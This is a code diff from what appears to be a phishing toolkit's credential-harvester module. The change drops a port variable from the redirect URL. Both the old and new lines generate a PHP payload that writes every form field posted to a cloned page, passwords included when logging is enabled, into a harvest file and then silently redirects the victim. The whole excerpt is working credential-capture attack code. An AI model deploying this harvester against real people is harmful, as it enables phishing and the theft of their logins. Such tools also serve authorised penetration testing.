@@ -512,15 +512,14 @@ def run():
         harvester_file = ("harvester_" + now + ".txt")
         log_password = check_config("HARVESTER_LOG_PASSWORDS=")
         harvester_redirect = check_config("HARVESTER_REDIRECT=")
-        WEB_PORT = str(check_config("WEB_PORT="))
         if harvester_redirect.lower() == "on":
             RAW_URL = check_config("HARVESTER_URL=")
         if log_password.lower() == "on":
             filewrite.write(
-                """<?php $file = '%s';file_put_contents($file, print_r($_POST, true), FILE_APPEND); \n/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=%s:%s" />\n""" % (harvester_file, RAW_URL,WEB_PORT))
+                """<?php $file = '%s';file_put_contents($file, print_r($_POST, true), FILE_APPEND); \n/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=%s" />\n""" % (harvester_file, RAW_URL))
         else:
             filewrite.write(
-                """<?php $file = '%s';$patt = '/password/';$store = $_POST;foreach($store as $key => $value){if(preg_match($patt,$key)){unset($store[$key]);}};file_put_contents($file, print_r($store, true), FILE_APPEND); \n/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=%s:%s" />\n""" % (harvester_file, RAW_URL,WEB_PORT))
+                """<?php $file = '%s';$patt = '/password/';$store = $_POST;foreach($store as $key => $value){if(preg_match($patt,$key)){unset($store[$key]);}};file_put_contents($file, print_r($store, true), FILE_APPEND); \n/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=%s" />\n""" % (harvester_file, RAW_URL))
         filewrite.close()
         if os.path.isdir("/var/www/html"):
             logpath = ("/var/www/html")
